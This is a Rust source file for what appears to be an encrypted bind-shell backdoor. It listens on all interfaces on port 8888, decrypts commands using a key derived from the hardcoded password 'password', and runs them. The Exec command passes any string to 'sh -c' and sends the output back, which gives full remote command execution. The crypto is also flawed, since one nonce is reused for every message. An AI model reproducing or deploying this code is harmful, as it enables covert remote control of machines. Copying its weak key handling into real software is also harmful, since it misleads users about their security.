use chacha20poly1305::Nonce;
use std::net::TcpListener;
use std::process::Stdio;
use std::{
    io::{Read, Write},
    process::exit,
};

mod common;

const PASSWORD: &str = "password";
const SERVER_ADDR: &str = "0.0.0.0:8888";

fn handle_client(mut stream: std::net::TcpStream) {
    let mut buffer = [0u8; 65536];
    let mut nonce = [0u8; common::NONCE_LEN];
    let key = common::derive_key(PASSWORD);
    let mut response_buffer = Vec::new();

    stream.read_exact(&mut nonce).unwrap();
    let nonce = Nonce::from_slice(&nonce);

    loop {
        let bytes_read = stream.read(&mut buffer).expect("Failed to read");
        if bytes_read == 0 {
            break;
        }

        let plaintext =
            common::decrypt_data(&buffer[..bytes_read], &key, nonce).expect("Failed to decrypt");
        let command: common::Command =
            bincode::deserialize(&plaintext).expect("error decoding command");

        match command {
            common::Command::Ls => {
                let output = std::process::Command::new("ls")
                    .output()
                    .expect("failed to execute ls");

                response_buffer
                    .write_all(&output.stdout)
                    .expect("failed to write");
            }
            common::Command::Cd { path } => {
                let success = std::env::set_current_dir(&path).is_ok();
                let result = if success { "success" } else { "failure" };
                response_buffer
                    .write_all(result.as_bytes())
                    .expect("failed to write");
            }
            common::Command::Pwd => {
                let path = std::env::current_dir()
                    .expect("failed to get current directory")
                    .display()
                    .to_string();
                response_buffer
                    .write_all(path.as_bytes())
                    .expect("failed to write");
            }
            common::Command::Echo { message } => {
                response_buffer
                    .write_all(message.as_bytes())
                    .expect("failed to write");
            }
            common::Command::Quit => {
                exit(-1);
            }
            common::Command::Exec { command } => {
                let output = std::process::Command::new("sh")
                    .arg("-c")
                    .arg(command)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output()
                    .expect("Failed to execute command");

                response_buffer
                    .write_all(&output.stdout)
                    .expect("failed to write");
            }
        }

        let ciphertext =
            common::encrypt_data(&response_buffer, &key, nonce).expect("Failed to encrypt");
        stream.write_all(&ciphertext).expect("Failed to write");
        stream.flush().expect("Failed to flush");
    }
}

fn main() {
    let listener = TcpListener::bind(SERVER_ADDR).expect("Failed to bind");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                std::thread::spawn(move || handle_client(stream));
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }
}
